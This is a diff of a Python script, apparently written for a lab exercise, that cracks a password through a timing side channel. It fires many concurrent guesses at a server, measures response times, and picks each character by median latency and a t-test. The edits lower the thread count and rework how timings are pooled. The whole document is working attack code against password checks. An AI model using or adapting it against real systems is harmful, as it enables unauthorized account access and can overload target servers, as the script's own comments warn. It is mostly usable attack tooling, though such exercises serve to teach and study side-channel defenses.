@@ -16,7 +16,7 @@ USER_ID = ID  # Replace with your ID/username
 DIFFICULTY = 4         # Adjust difficulty
 CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
 RETRIES = 150         # Number of measurements per character (we take the median to mitigate outliers)
-WORKERS = 25           # Number of concurrent threads (if this number is too high the code goes crazy, i believe its too many request for the server at the same time)
+WORKERS = 20           # Number of concurrent threads (if this number is too high the code goes crazy, i believe its too many request for the server at the same time)
 # keep workers low , WORKERS < (1/2 * RETRIES - 5) or so to keep the server from crashing
 
 
@@ -49,7 +49,7 @@ def measure_time_for_character(i_user, i_difficulty, candidate, retries, workers
                 timings.append(result)
 
     # Compute the median time
-    return median(timings) if timings else float("inf")
+    return timings if timings else float("inf")
 
 
 def find_password_length(user, difficulty):
@@ -62,7 +62,7 @@ def find_password_length(user, difficulty):
     prev_time = 0
     for length in range(1, 33):  # Test lengths up to 32
         test_password = base_password * length
-        med_time = measure_time_for_character(user, difficulty, test_password, RETRIES, WORKERS)
+        med_time = median(measure_time_for_character(user, difficulty, test_password, RETRIES, WORKERS))
         print(f"Length {length}, median time: {med_time:.5f}s")
 
         if med_time > prev_time + 0.02:  # Adjust the threshold for difficulty
@@ -80,54 +80,62 @@ def find_password(user, difficulty, length):
     """
     print(f"Searching for password of length {length}...")
     password = ""
-    
 
     for position in range(length):
-        #intilize variables for the character that took the longest on average
+        # Initialize variables for tracking max time and best char
         max_time = 0
         best_char = ""
         ttest_flag = False
-        
-        #intilize two groups for ttest
-        groupNotLikely = []
-        groupLikely = []
+
+        # Initialize two groups for T-test
+        group_not_likely = []
+        group_likely = []
 
         for char in CHARACTERS:
-            #create candidate password
+            # Create a candidate password
             candidate = password + char + "a" * (length - len(password) - 1)
             print(f"Testing '{candidate}' at position {position}...")
 
-            # Measure the response time for the candidate password
-            med_time = measure_time_for_character(user, difficulty, candidate, RETRIES, WORKERS)
+            # Measure response times for the candidate password
+            time_list = measure_time_for_character(user, difficulty, candidate, RETRIES, WORKERS)
+
+            # Flatten groups to hold individual time points
+            group_not_likely.extend(time_list)
+
+            # Compute median time for the current character
+            med_time = median(time_list)
             print(f"Character '{char}' median time: {med_time:.5f}s")
 
-            #mark it if its the one that took the longest on average so far
-            if med_time > max_time:
-                max_time = med_time
-                best_char = char
-            
-            # TTest check for significant difference of the character we're on compared to previous ones
-            if char <= 'e': # if the character is in the first e characters of the alphabet skip over ttest not enough data
-                groupNotLikely.append(med_time)
-            else:
-                groupLikely.append(med_time)
-                t_stat, p_value = ttest_ind(groupNotLikely, groupLikely)
-                print(f"p_value: {p_value:.5f}")
-                if p_value < 0.005:
-                    print(f"Found character by P_Value (ttest) {position}: '{char}' with median time {max_time:.5f}s")
+           
+
+            # Perform T-test once there is enough data
+            if len(group_not_likely) >= 3 * RETRIES:  # Ensure both groups have sufficient data
+                # Assign the last `RETRIES` measurements to the likely group
+                group_likely = group_not_likely[-RETRIES:]
+                group_not_likely = group_not_likely[:-RETRIES]
+
+                # Conduct the T-test
+                t_stat, p_value = ttest_ind(group_not_likely, group_likely, equal_var=False)
+                print(f"T-test p_value: {p_value:.5f}")
+
+                # Check for significance and median time
+                if p_value < 0.003 and med_time > max_time:
+                    print(f"Found character by T-test at position {position}: '{char}' with median time {med_time:.5f}s")
                     password += char
                     print(f"Partial password: {password}")
                     ttest_flag = True
-                    break
-                else:
-                    groupLikely.pop()
-                    groupNotLikely.append(med_time)
+                    break  # Move to the next position
+            
+             # Update best character if it has the longest median time
+            if med_time > max_time:
+                max_time = med_time
+                best_char = char
 
-        #skip to the next position if we found the character by ttest              
+        # Skip to the next position if T-test found the character
         if ttest_flag:
             continue
 
-        #take the character that took the longest on average if no ttest significance was found
+        # Default to the character with the longest median time if T-test fails
         password += best_char
         print(f"Best character at position {position}: '{best_char}' with median time {max_time:.5f}s")
         print(f"Partial password: {password}")
